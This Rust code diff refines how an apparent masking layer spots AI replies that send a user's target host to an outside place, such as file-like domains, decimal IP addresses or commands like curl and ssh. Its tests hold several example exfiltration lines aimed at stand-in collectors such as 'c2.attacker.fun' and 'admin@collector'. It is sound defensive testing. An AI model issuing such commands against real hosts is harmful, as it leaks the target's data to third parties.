@@ -545,8 +545,10 @@ const PUBLIC_TLDS: &[&str] = &[
     "fm",
     "am",
 ];
-/// Country codes that are far more often a file ending than a domain: a
-/// two-part name under one of them (`install.sh`, `README.md`) is a file.
+/// Country codes that are far more often a file ending than a domain: in a
+/// request, a two-part name under one of them (`install.sh`, `README.md`)
+/// is a file. In a reply only a path's last part or a common file name is
+/// ([`is_common_file`]): `x7.sh` can be a collector.
 const FILE_LIKE_TLDS: &[&str] = &[
     "py", "sh", "md", "rs", "so", "ps", "pm", "do", "cf", "mk", "sc", "cc",
 ];
@@ -2754,6 +2756,8 @@ impl Vault {
             unit_raw: String::new(),
             unit_filled: String::new(),
             unit_elsewhere: false,
+            number_waits: false,
+            word_before: String::new(),
             unit_too_long: false,
             line_start: String::new(),
             fence: None,
@@ -2939,13 +2943,129 @@ static NUMBER_RUN: LazyLock<Regex> = LazyLock::new(|| {
     Regex::new(r"(?:0x[0-9a-f]+|[0-9]+)(?:\.(?:0x[0-9a-f]+|[0-9]+))+").expect("valid regex")
 });
 
-/// Whether the last part of a name can be a top-level domain: letters, or
-/// letters written as `xn--` (`xn--p1ai` is `рф`).
-fn is_tld_like(tld: &str) -> bool {
-    (tld.len() >= 2 && tld.bytes().all(|b| b.is_ascii_lowercase()))
+/// The top-level domains of the root zone, and those other resolvers
+/// answer for (`i2p`, `bit`, `eth`).
+static ROOT_TLDS: LazyLock<HashSet<&'static str>> = LazyLock::new(|| {
+    include_str!("tlds.txt")
+        .lines()
+        .filter(|line| !line.starts_with('#'))
+        .flat_map(str::split_whitespace)
+        .chain(["i2p", "bit", "eth"])
+        .collect()
+});
+
+/// Whether the last part of a name is a top-level domain a name can be
+/// looked up under: one of [`ROOT_TLDS`], or one written as `xn--`
+/// (`xn--p1ai` is `рф`). `my.cnf`, `go.mod`, `server.ssl.enabled` and
+/// `com.fasterxml.jackson.databind` end in none.
+fn is_tld(tld: &str) -> bool {
+    ROOT_TLDS.contains(tld)
         || tld.strip_prefix("xn--").is_some_and(|rest| {
             !rest.is_empty() && rest.bytes().all(|b| b.is_ascii_alphanumeric() || b == b'-')
         })
+}
+
+/// Names of files common enough that, under a top-level domain that is
+/// also a file ending, the two-part name is that file: `settings.py`,
+/// `README.md`, `main.cf`, `application.properties`.
+const FILE_STEMS: &[&str] = &[
+    "readme",
+    "changelog",
+    "changes",
+    "license",
+    "licence",
+    "contributing",
+    "security",
+    "install",
+    "setup",
+    "settings",
+    "config",
+    "configure",
+    "main",
+    "master",
+    "local",
+    "index",
+    "app",
+    "application",
+    "manage",
+    "models",
+    "views",
+    "urls",
+    "wsgi",
+    "asgi",
+    "conftest",
+    "server",
+    "client",
+    "utils",
+    "common",
+    "default",
+    "defaults",
+    "base",
+    "lib",
+    "mod",
+    "build",
+    "deploy",
+    "run",
+    "start",
+    "stop",
+    "entrypoint",
+    "docker-entrypoint",
+    "init",
+    "bootstrap",
+    "backup",
+    "update",
+    "upgrade",
+    "test",
+    "tests",
+    "logging",
+    "messages",
+    "database",
+    "hibernate",
+    "sendmail",
+    "submit",
+    "nginx",
+    "httpd",
+    "sshd",
+    "mysqld",
+    "postgres",
+    "redis",
+];
+
+/// Whether a two-part name under a top-level domain that is also a file
+/// ending (`settings.py`, `application.properties`) is a file: a common
+/// one ([`FILE_STEMS`]), a library (`libssl.so`), or one no one can
+/// register (`local_settings.py`, `id_rsa.pub`). So are fail2ban's
+/// `jail.local` and `fail2ban.local`. `app.so` and `index.pub` are not.
+/// `name` is in lower case.
+fn is_common_file(name: &str) -> bool {
+    let Some((stem, tld)) = name.split_once('.') else {
+        return false;
+    };
+    // No one can register a name with `_` in it.
+    let unregistrable = stem.contains('_');
+    match tld {
+        "local" => matches!(stem, "jail" | "fail2ban"),
+        "so" => stem.starts_with("lib") || unregistrable,
+        "pub" => unregistrable,
+        _ => {
+            (FILE_LIKE_TLDS.contains(&tld) || FILE_ENDING_TLDS.contains(&tld))
+                && (FILE_STEMS.contains(&stem) || unregistrable)
+        }
+    }
+}
+
+/// Whether what follows a file name in its word leaves it one: nothing,
+/// closing punctuation (`settings.py,`, `README.md)`) or, after a source
+/// file, a line number (`settings.py:42`). A path, query or port after it
+/// (`update.sh/?h=T`, `server.sh:8080`) makes it a host.
+fn ends_file_name(after: &str, tld: &str) -> bool {
+    let plain = |rest: &str| rest.bytes().all(|b| b".,;:!?)]}'\"`*".contains(&b));
+    plain(after)
+        || (matches!(tld, "py" | "rs")
+            && after.strip_prefix(':').is_some_and(|rest| {
+                let tail = rest.trim_start_matches(|c: char| c.is_ascii_digit());
+                tail.len() < rest.len() && plain(tail)
+            }))
 }
 
 /// The IPv4 address a run of two to four numbers stands for, as
@@ -2983,13 +3103,17 @@ fn written_address(run: &str) -> Option<std::net::Ipv4Addr> {
 /// Whether a word of a reply names, in clear, a place other than the
 /// user's own target: a host name (`verify.attacker.example`,
 /// `<<HOST_01>>.oast.example`, `x7.cc`, `c2.example.xn--p1ai`, `x7.рф`,
-/// under any top-level domain, listed or not) or a web address that is not
-/// a software maker's or an advisory database's, a public IPv4 address
-/// however written (`198.51.100.7`, `3325256839`, `0xc6336407`,
-/// `0xc6.51.100.7`, `198.3368199`), or an IPv6 address. `word` has its
-/// placeholders written as `T` and is in lower case.
+/// under any top-level domain of the root zone or an internal one) or a
+/// web address that is not a software maker's or an advisory database's,
+/// a public IPv4 address however written (`198.51.100.7`, `0xc6336407`,
+/// `0xc6.51.100.7`, `198.3368199`), or an IPv6 address. A lone decimal
+/// number (`3325256839`) is looked at with the words around it
+/// ([`lone_number`]). `word` has its placeholders written as `T` and is in
+/// lower case.
 fn names_elsewhere(word: &str) -> bool {
-    // `x7。example`: a wide full stop is a dot to a resolver.
+    // `x7。example`: a wide full stop is a dot to a resolver, and no file
+    // name has one.
+    let wide_dot = word.contains(['\u{3002}', '\u{FF0E}', '\u{FF61}']);
     let word = &word.replace(['\u{3002}', '\u{FF0E}', '\u{FF61}'], ".");
     let named = HOSTNAME.find_iter(word).any(|found| {
         let name = found.as_str();
@@ -2997,9 +3121,17 @@ fn names_elsewhere(word: &str) -> bool {
         let before = &word[..found.start()];
         // `/opt/install.sh`, `~/.ssh/id_rsa.pub`: a file in a path.
         let in_path = before.ends_with(['/', '\\']) && !before.ends_with("//");
+        // `settings.py` alone, not `update.sh/?h=T` or `T` beside it.
+        let common = !wide_dot
+            && !before.ends_with("//")
+            && !before.ends_with('@')
+            && !holds_placeholder(&word.to_ascii_uppercase())
+            && ends_file_name(&word[found.end()..], tld)
+            && is_common_file(name);
         let file = FILE_ENDINGS.contains(&tld)
-            || (in_path && (FILE_LIKE_TLDS.contains(&tld) || FILE_ENDING_TLDS.contains(&tld)));
-        INTERNAL_TLDS.contains(&tld) || (is_tld_like(tld) && !file && !is_public_name(name))
+            || (in_path && (FILE_LIKE_TLDS.contains(&tld) || FILE_ENDING_TLDS.contains(&tld)))
+            || common;
+        !file && (INTERNAL_TLDS.contains(&tld) || (is_tld(tld) && !is_public_name(name)))
     });
     // `x7.рф`, `x7.аttacker.com`: a name written in other letters.
     let wide = !word.is_ascii()
@@ -3025,14 +3157,14 @@ fn names_elsewhere(word: &str) -> bool {
                 .is_some_and(|b| b.is_ascii_alphanumeric() || *b == b'_');
         free && written_address(found.as_str()).is_some_and(is_reachable_v4)
     });
-    // `curl 3325256839`, `ping 0xc6336407`: one number is an address too.
+    // `ping 0xc6336407`, `ping 031214662007`: one number is an address too.
     let number = word
         .split(|c: char| !c.is_ascii_alphanumeric())
         .filter_map(|part| match part.strip_prefix("0x") {
             Some(hex) if (1..=8).contains(&hex.len()) => u32::from_str_radix(hex, 16).ok(),
             Some(_) => None,
             None if part.len() > 1 && part.starts_with('0') => u32::from_str_radix(part, 8).ok(),
-            None => part.parse::<u32>().ok(),
+            None => None,
         })
         .any(|n| n >= 1 << 24 && is_reachable_v4(std::net::Ipv4Addr::from(n)));
     let ipv6 = IPV6_RUN.find_iter(word).any(|found| {
@@ -3055,6 +3187,138 @@ fn names_elsewhere(word: &str) -> bool {
         !host.is_empty() && !is_public_name(host.trim_end_matches('.'))
     });
     named || wide || address || number || ipv6 || linked
+}
+
+/// Words a count or a size is given in: `104857600 bytes`, `-byte`.
+const UNITS: &[&str] = &[
+    "b",
+    "byte",
+    "bytes",
+    "kb",
+    "kib",
+    "mb",
+    "mib",
+    "gb",
+    "gib",
+    "tb",
+    "tib",
+    "bit",
+    "bits",
+    "bps",
+    "kbps",
+    "mbps",
+    "gbps",
+    "ms",
+    "us",
+    "ns",
+    "s",
+    "sec",
+    "secs",
+    "second",
+    "seconds",
+    "min",
+    "mins",
+    "minute",
+    "minutes",
+    "hour",
+    "hours",
+    "day",
+    "days",
+    "row",
+    "rows",
+    "record",
+    "records",
+    "request",
+    "requests",
+    "connection",
+    "connections",
+    "packet",
+    "packets",
+    "file",
+    "files",
+    "line",
+    "lines",
+    "entry",
+    "entries",
+    "item",
+    "items",
+    "time",
+    "times",
+    "token",
+    "tokens",
+    "character",
+    "characters",
+    "chars",
+    "iteration",
+    "iterations",
+    "round",
+    "rounds",
+    "attempt",
+    "attempts",
+    "event",
+    "events",
+    "message",
+    "messages",
+    "block",
+    "blocks",
+    "page",
+    "pages",
+];
+/// Words a size, limit or count follows: `client_max_body_size 104857600`,
+/// `limit=104857600`.
+const QUANTITIES: &[&str] = &[
+    "size",
+    "limit",
+    "max",
+    "maximum",
+    "min",
+    "minimum",
+    "length",
+    "len",
+    "count",
+    "total",
+    "timeout",
+    "ttl",
+    "bytes",
+    "memory",
+    "buffer",
+    "quota",
+    "serial",
+    "uid",
+    "gid",
+    "pid",
+    "inode",
+    "offset",
+    "epoch",
+    "timestamp",
+];
+
+/// Whether a word is a unit a count or size is given in (`bytes,`).
+fn is_unit(word: &str) -> bool {
+    UNITS.contains(&word.trim_matches(|c: char| !c.is_ascii_alphanumeric()))
+}
+
+/// Whether a word names a size, limit or count (`client_max_body_size`).
+fn names_quantity(word: &str) -> bool {
+    word.split(|c: char| !c.is_ascii_alphanumeric())
+        .any(|part| QUANTITIES.contains(&part))
+}
+
+/// Whether a word holds a lone decimal number that is a public IPv4
+/// address (`3325256839` is 198.51.100.7) and is not a size or a count
+/// in the word itself (`limit=104857600`, `104857600-byte`). The words
+/// around it say the rest ([`StreamUnmasker::words`]). `word` is in lower
+/// case.
+fn lone_number(word: &str) -> bool {
+    let parts: Vec<&str> = word.split(|c: char| !c.is_ascii_alphanumeric()).collect();
+    parts.iter().enumerate().any(|(at, part)| {
+        !part.starts_with('0')
+            && part
+                .parse::<u32>()
+                .is_ok_and(|n| n >= 1 << 24 && is_reachable_v4(std::net::Ipv4Addr::from(n)))
+            && !(at > 0 && QUANTITIES.contains(&parts[at - 1]))
+            && !parts.get(at + 1).is_some_and(|next| UNITS.contains(next))
+    })
 }
 
 /// Programs that reach another host, and interpreters and shells, as a
@@ -3328,17 +3592,32 @@ fn starts_command(words: &[&str]) -> bool {
 
 /// Whether a word after a program is one of its arguments: a flag, an
 /// address, a name, a path or query (`collector/?h=T`), a number or a
-/// placeholder (`T`).
+/// placeholder (`T`). A port as prose names it (`22/tcp`) is none.
 fn is_argument(word: &str) -> bool {
-    word.starts_with(['-', '@', '$', '/', '\'', '"', '~', '.', '[', '<'])
-        || word.contains(['/', '?', '=', '@'])
-        || word.starts_with(|c: char| c.is_ascii_digit())
-        || word == "T"
-        || word
-            .strip_prefix('T')
-            .is_some_and(|rest| rest.starts_with(['.', ':', '/', '@', '[', ',', ';']))
-        || word.contains("://")
-        || word.trim_end_matches('.').contains('.')
+    !is_port_name(word)
+        && (word.starts_with(['-', '@', '$', '/', '\'', '"', '~', '.', '[', '<'])
+            || word.contains(['/', '?', '=', '@'])
+            || word.starts_with(|c: char| c.is_ascii_digit())
+            || word == "T"
+            || word
+                .strip_prefix('T')
+                .is_some_and(|rest| rest.starts_with(['.', ':', '/', '@', '[', ',', ';']))
+            || word.contains("://")
+            || word.trim_end_matches('.').contains('.'))
+}
+
+/// A port as prose names it: `22/tcp`, `(21/tcp)`, `53/UDP,`.
+fn is_port_name(word: &str) -> bool {
+    let word = word
+        .trim_start_matches(['(', '['])
+        .trim_end_matches([')', ']', ',', '.', ';', ':']);
+    word.split_once('/').is_some_and(|(port, protocol)| {
+        (1..=5).contains(&port.len())
+            && port.bytes().all(|b| b.is_ascii_digit())
+            && ["tcp", "udp", "sctp"]
+                .iter()
+                .any(|name| protocol.eq_ignore_ascii_case(name))
+    })
 }
 
 /// Whether a line of a reply reads as a command to run rather than as
@@ -3377,8 +3656,68 @@ fn is_command_line(line: &str) -> bool {
             .strip_prefix('-')
             .map(|rest| rest.strip_prefix('-').unwrap_or(rest))
             .is_some_and(|rest| rest.starts_with(|c: char| c.is_ascii_alphabetic()));
-        flag || runs_program(COMMAND_WORDS, &words, at, 1)
+        flag || (runs_program(COMMAND_WORDS, &words, at, 1) && !is_named_thing(&words, at))
             || runs_program(NAME_SERVER_PROGRAMS, &words, at, 2)
+    })
+}
+
+/// Words that make the word after them a thing a sentence talks about.
+const DETERMINERS: &[&str] = &[
+    "the", "a", "an", "this", "that", "these", "those", "its", "their", "his", "her", "your",
+    "our", "my", "each", "every", "any", "no", "some",
+];
+
+/// Words after which a sentence says where or what, not what a program
+/// is given: `the NFS mount /srv/share on T`.
+const PREPOSITIONS: &[&str] = &[
+    "on", "in", "at", "of", "for", "from", "to", "with", "by", "via", "across", "behind", "inside",
+    "within", "under", "over", "onto", "into", "between", "against", "per",
+];
+
+/// Whether the program word at `at` is a thing the sentence talks about,
+/// not a command: after an article or the like, maybe with an acronym
+/// between (`the NFS mount /srv/share on T`), and with no word after it,
+/// up to a preposition or the end of the clause, that holds a placeholder
+/// or names where it connects (`the dig @52.12.7 T`, `the ssh
+/// admin@collector echo T`).
+fn is_named_thing(words: &[&str], at: usize) -> bool {
+    let mut before = words[..at].iter().rev();
+    let mut previous = before.next();
+    if previous.is_some_and(|word| {
+        (2..=6).contains(&word.len())
+            && word
+                .bytes()
+                .all(|b| b.is_ascii_uppercase() || b.is_ascii_digit())
+            && word.bytes().any(|b| b.is_ascii_uppercase())
+    }) {
+        previous = before.next();
+    }
+    if !previous.is_some_and(|word| DETERMINERS.contains(&word.to_ascii_lowercase().as_str())) {
+        return false;
+    }
+    for word in &words[at + 1..] {
+        if PREPOSITIONS.contains(&word.to_ascii_lowercase().as_str()) {
+            break;
+        }
+        if holds_placeholder(word) || word.contains('@') {
+            return false;
+        }
+        if word.ends_with(['.', ',', ';', ':', '!', '?', ')']) {
+            break;
+        }
+    }
+    true
+}
+
+/// Whether a word of a line whose placeholders are written as `T` holds
+/// one: a `T` with no letter, digit or `_` beside it.
+fn holds_placeholder(word: &str) -> bool {
+    let bytes = word.as_bytes();
+    let free = |at: Option<&u8>| !at.is_some_and(|b| b.is_ascii_alphanumeric() || *b == b'_');
+    bytes.iter().enumerate().any(|(at, b)| {
+        *b == b'T'
+            && free(at.checked_sub(1).and_then(|before| bytes.get(before)))
+            && free(bytes.get(at + 1))
     })
 }
 
@@ -3430,6 +3769,11 @@ pub struct StreamUnmasker {
     unit_filled: String,
     /// It names a place other than the user's own target.
     unit_elsewhere: bool,
+    /// The last word was a lone number that is an address unless this
+    /// word is a unit ([`StreamUnmasker::weigh_number`]).
+    number_waits: bool,
+    /// The last whole word of the line, in lower case.
+    word_before: String,
     /// It grew past [`MAX_UNIT`] and is shown as it comes.
     unit_too_long: bool,
     /// The start of the current line, to see whether it is a code fence.
@@ -3472,6 +3816,8 @@ impl StreamUnmasker {
         self.secret_kept = false;
         self.other_kept = false;
         self.own_kept = false;
+        self.number_waits = false;
+        self.word_before.clear();
         self.in_external_word = false;
         self.word_tail.clear();
         self.md_link_parens = 0;
@@ -3554,11 +3900,12 @@ impl StreamUnmasker {
     }
 
     /// One word of the reply, with its placeholders filled in as far as
-    /// the word itself allows, and whether it names a place other than the
-    /// user's own target.
-    fn word(&mut self, word: &str) -> (String, bool) {
+    /// the word itself allows, whether it names a place other than the
+    /// user's own target, and whether it is a lone number that can be an
+    /// address ([`lone_number`]).
+    fn word(&mut self, word: &str) -> (String, bool, bool) {
         if word.is_empty() {
-            return (String::new(), false);
+            return (String::new(), false, false);
         }
         let ends_ws = word.ends_with(char::is_whitespace);
         let core = word.trim_end_matches(char::is_whitespace);
@@ -3592,7 +3939,7 @@ impl StreamUnmasker {
                 self.in_ref_label = false;
                 self.at_line_start = true;
             }
-            return (word.to_owned(), false);
+            return (word.to_owned(), false, false);
         }
 
         let stripped = TOKEN.replace_all(core, "T");
@@ -3713,6 +4060,7 @@ impl StreamUnmasker {
             TOKEN.replace_all(core, "T").to_ascii_lowercase()
         );
         let elsewhere = own_host.is_none() && names_elsewhere(&probe);
+        let number = own_host.is_none() && lone_number(&probe);
         for found in TOKEN.find_iter(core) {
             let tok = found.as_str();
             if self.secrets.contains(tok) {
@@ -3772,7 +4120,7 @@ impl StreamUnmasker {
         } else {
             format!("{}{trailing_ws}", self.fill(core))
         };
-        (filled, elsewhere)
+        (filled, elsewhere, number)
     }
 
     /// Takes in whole words and returns the lines (and code blocks) that
@@ -3780,8 +4128,9 @@ impl StreamUnmasker {
     fn words(&mut self, text: &str) -> String {
         let mut out = String::new();
         for word in text.split_inclusive(char::is_whitespace) {
-            let (filled, elsewhere) = self.word(word);
+            let (filled, elsewhere, number) = self.word(word);
             self.unit_elsewhere |= elsewhere;
+            self.weigh_number(word, number);
             if self.line_start.len() < 256 {
                 self.line_start.push_str(word);
             }
@@ -3797,10 +4146,28 @@ impl StreamUnmasker {
                 }
             }
             if word.contains('\n') {
+                self.unit_elsewhere |= std::mem::take(&mut self.number_waits);
+                self.word_before.clear();
                 self.end_line(&mut out);
             }
         }
         out
+    }
+
+    /// A lone number is an address (`Report <<HOST_01>> to 3325256839`)
+    /// unless the word before names a size or count, or the word after is
+    /// a unit: `limit 104857600`, `104857600 bytes`.
+    fn weigh_number(&mut self, word: &str, number: bool) {
+        let core = word.trim_end_matches(char::is_whitespace);
+        if core.is_empty() {
+            return;
+        }
+        let core = TOKEN.replace_all(core, "T").to_ascii_lowercase();
+        if std::mem::take(&mut self.number_waits) && !is_unit(&core) {
+            self.unit_elsewhere = true;
+        }
+        self.number_waits = number && !names_quantity(&self.word_before);
+        self.word_before = core.chars().take(64).collect();
     }
 
     /// A line has ended: it is let go, unless it opens a code block or is
@@ -3861,6 +4228,8 @@ impl StreamUnmasker {
     fn drain(&mut self) -> String {
         let rest = std::mem::take(&mut self.held);
         let mut out = self.words(&rest);
+        self.unit_elsewhere |= std::mem::take(&mut self.number_waits);
+        self.word_before.clear();
         self.unit_code |= self.fence.is_some() || is_indented_code(&self.line_start);
         self.flush_unit(&mut out);
         self.line_start.clear();
@@ -4988,6 +5357,103 @@ mod tests {
             ),
         ] {
             assert_eq!(unmask(reply), shown);
+        }
+    }
+
+    /// v0.2.6 review AI-1: prose that names a file, a package, a setting, a
+    /// size or a port gets the target's values back; a line that names a
+    /// place a name can be looked up at still does not.
+    #[test]
+    fn prose_about_files_packages_sizes_and_ports_gets_the_targets_values() {
+        let mut vault = Vault::ephemeral();
+        let request = vault
+            .mask_json(&json!({"address": "192.0.2.10", "route_hops": ["192.168.1.1"]}))
+            .to_string();
+        let unmask = |reply: &str| {
+            let mut stream = vault.stream_for_host(&request, &["192.0.2.10"], &[]);
+            let mut whole = stream.push(reply);
+            whole.push_str(&stream.finish());
+            let mut stream = vault.stream_for_host(&request, &["192.0.2.10"], &[]);
+            let mut pieces = String::new();
+            for piece in reply.as_bytes().chunks(4) {
+                pieces.push_str(&stream.push(std::str::from_utf8(piece).unwrap()));
+            }
+            pieces.push_str(&stream.finish());
+            assert_eq!(whole, pieces, "{reply}");
+            whole
+        };
+        for prose in [
+            "Tune my.cnf on <<HOST_01>> to bind to localhost.",
+            "Harden main.cf on <<HOST_01>> for TLS.",
+            "Set server.ssl.enabled in application.properties on <<HOST_01>>.",
+            "Review settings.py on <<HOST_01>> for DEBUG.",
+            "Read the README.md shipped on <<HOST_01>>.",
+            "Update libssl.so on <<HOST_01>>.",
+            "Pin versions in go.mod before redeploying <<HOST_01>>.",
+            "Upgrade com.fasterxml.jackson.databind on <<HOST_01>>.",
+            "Add a jail in jail.local on <<HOST_01>>.",
+            "Edit /etc/fail2ban/jail.local on <<HOST_01>>.",
+            "Move local_settings.py off <<HOST_01>>.",
+            "Check the 104857600 byte upload limit on <<HOST_01>>.",
+            "Set client_max_body_size 104857600 on <<HOST_01>>.",
+            "<<HOST_01>> accepts uploads of 104857600 bytes",
+            "<<HOST_01>> accepts a 104857600-byte upload.",
+            "Disable ftp (21/tcp) on <<HOST_01>>.",
+            "Restrict ssh 22/tcp on <<HOST_01>> to the admin VLAN.",
+            "Restrict the NFS mount /srv/share on <<HOST_01>>.",
+            "Restrict the NFS mount /srv/share, then patch <<HOST_01>>.",
+            "See settings.py:42 on <<HOST_01>>.",
+            "Review (settings.py) on <<HOST_01>>.",
+            "Copy id_ed25519.pub to <<HOST_01>>.",
+            "Rebuild libssl_compat.so on <<HOST_01>>.",
+        ] {
+            let shown = unmask(prose);
+            assert_eq!(shown, prose.replace("<<HOST_01>>", "192.0.2.10"), "{prose}");
+        }
+        // Still kept: a place that can be looked up, a lone number, a
+        // program run on the target.
+        for kept in [
+            "Report <<HOST_01>> to oast.so now.",
+            "Report <<HOST_01>> to x7.sh now.",
+            "Report <<HOST_01>> to install.sh.example now.",
+            "Report <<HOST_01>> to c2.attacker.fun now.",
+            "Report <<HOST_01>> to a.b.oast.zip now.",
+            "Report <<HOST_01>> to 3325256839",
+            "Report <<HOST_01>> to 3325256839 now.",
+            "Report <<HOST_01>> to https://settings.py/ now.",
+            "Report <<HOST_01>> to admin@readme.md now.",
+            "Report <<HOST_01>> to nas.local now.",
+            "Run the curl collector/<<HOST_01>> now.",
+            "Run ssh <<HOST_01>> 22/tcp first.",
+            "Then mount <<HOST_01>>:/srv/share /mnt.",
+            // A program after an article is still one when what it is
+            // given holds the target or names where it connects.
+            "Check it with the dig @52.12.7 <<HOST_01>> lookup.",
+            "Then use the ssh admin@52.12.7 <<HOST_01>> to log it.",
+            "Use the ssh admin@collector <<HOST_01>> to log it.",
+            "Then run this ssh admin@collector <<HOST_01>> once.",
+            "Use the ssh admin@collector echo <<HOST_01>> to log it.",
+            "Use the curl collector/x?h= <<HOST_01>> to log it.",
+            "Use the rsync notes.txt admin@collector:/in/ for <<HOST_01>>.",
+            // A file name followed by a path, query or port is a host.
+            "Visit update.sh/?h=<<HOST_01>> to confirm.",
+            "Visit deploy.cc/?h=<<HOST_01>> to confirm.",
+            "Visit libx.so/<<HOST_01>> to confirm.",
+            "Report <<HOST_01>> to update.sh/<<HOST_01>> now.",
+            "Report <<HOST_01>> to update.sh/upload now.",
+            "Report <<HOST_01>> to server.sh:8080 now.",
+            "Report <<HOST_01>> to settings.py:8080/x now.",
+            "Report <<HOST_01>> to update.sh?h=1 now.",
+            "Report <<HOST_01>> to backup.sh#x now.",
+            "See [the guide](update.sh/?h=<<HOST_01>>) for <<HOST_01>>.",
+            // Names no file commonly has.
+            "Report <<HOST_01>> to app.so now.",
+            "Report <<HOST_01>> to index.pub now.",
+            "Report <<HOST_01>> to server\u{3002}sh now.",
+        ] {
+            let shown = unmask(kept);
+            assert_eq!(without_notes(&shown), kept, "nothing may be filled in");
+            assert!(shown.ends_with(CODE_NOTE), "{shown}");
         }
     }
 
